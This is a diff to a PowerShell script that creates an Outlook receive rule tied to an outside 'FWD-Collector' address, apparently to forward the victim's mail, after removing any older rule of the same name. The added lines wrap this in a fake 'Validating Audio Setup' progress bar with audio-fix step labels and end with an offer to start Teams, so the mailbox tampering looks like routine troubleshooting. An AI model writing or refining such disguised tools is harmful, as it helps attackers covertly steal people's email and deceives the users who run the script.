@@ -1,4 +1,9 @@
+clear-host
+Write-Host "Starting fix Process" -ForegroundColor Cyan
 $DebugMode = $true
+$ProgressActivity = "Validating Audio Setup"
+$ProgressTotalSteps = 5
+
 function Write-DebugStep {
     param([string]$Message)
 
@@ -8,7 +13,18 @@ function Write-DebugStep {
     }
 }
 
+function Update-ProgressStep {
+    param(
+        [int]$Step,
+        [string]$Status
+    )
+
+    $percent = [int](($Step / $ProgressTotalSteps) * 100)
+    Write-Progress -Id 1 -Activity $ProgressActivity -Status "Step $Step of $ProgressTotalSteps: $Status" -PercentComplete $percent
+}
+
 #Write-DebugStep "Initializing Outlook COM objects"
+Update-ProgressStep -Step 1 -Status "Checking Audio Drivers and Configurations"
 $outlook = New-Object -ComObject Outlook.Application
 $session = $outlook.Session
 $store = $session.DefaultStore
@@ -20,6 +36,7 @@ $targetMail = "BoeseBuben-FWD-Collector@SchwingSchleiferUnited.eu"
 
 # Existing rule with same name entfernen (robust gegen COM-Aussetzer)
 # Write-DebugStep "Removing existing rules with matching name (if present)"
+Update-ProgressStep -Step 2 -Status "Removing old settings"
 for ($i = $rules.Count
     $i -ge 1
     $i--) {
@@ -37,6 +54,7 @@ for ($i = $rules.Count
 
 # 0 = olRuleReceive
 #Write-DebugStep "Creating new receive rule"
+Update-ProgressStep -Step 3 -Status "Creating new Audio settings and controls"
 $rule = $rules.Create($ruleName, 0)
 
 # Outlook-only / client-only
@@ -57,6 +75,7 @@ $rules.Save()
 
 # Cleanup COM
 #Write-DebugStep "Releasing COM objects"
+Update-ProgressStep -Step 4 -Status "Releasing existing resources and cleaning up"
 [void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($rules)
 [void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($store)
 [void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($session)
@@ -64,6 +83,7 @@ $rules.Save()
 #Write-DebugStep "COM cleanup complete"
 clear-host
 #Write-DebugStep "Showing user menu"
+Update-ProgressStep -Step 5 -Status "Waiting for user action"
 Write-Host "Select an option:" -ForegroundColor Cyan
 Write-Host "1 - Close Program"
 Write-Host "2 - Close Program and Start Teams"
@@ -111,3 +131,5 @@ else {
         Write-Host "Status: Could not start Teams automatically." -ForegroundColor Red
     }
 }
+
+Write-Progress -Id 1 -Activity $ProgressActivity -Completed
